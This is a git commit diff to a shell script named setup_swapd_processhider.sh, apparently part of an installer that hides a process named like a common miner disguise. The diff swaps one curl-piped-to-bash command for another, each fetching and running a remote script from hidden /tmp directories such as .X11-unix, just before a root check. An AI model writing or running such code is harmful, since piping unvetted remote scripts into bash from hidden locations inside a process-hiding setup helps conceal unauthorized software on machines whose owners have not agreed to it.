8f087d4e40d8deb11a48d960ff8ea6423db33c17
littlAcen <113854209+littlAcen@users.noreply.github.com>
2023-09-24 18:42:54 +0200

    Update setup_swapd_processhider.sh

--- setup_swapd_processhider.sh
+++ setup_swapd_processhider.sh
@@ -551,9 +551,9 @@ optimize_func() {
   echo "1GB pages successfully enabled"
 }
 
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -LsO bench.monster/speedtest.sh; bash speedtest.sh -eu -i -io -ip
-
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -sL yabs.sh | bash
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -LsO bench.monster/speedtest.sh; bash speedtest.sh -eu -i -io -ip
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -sL yabs.sh | bash
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash
 
 if [ $(id -u) = 0 ]; then
    echo "Running as root"
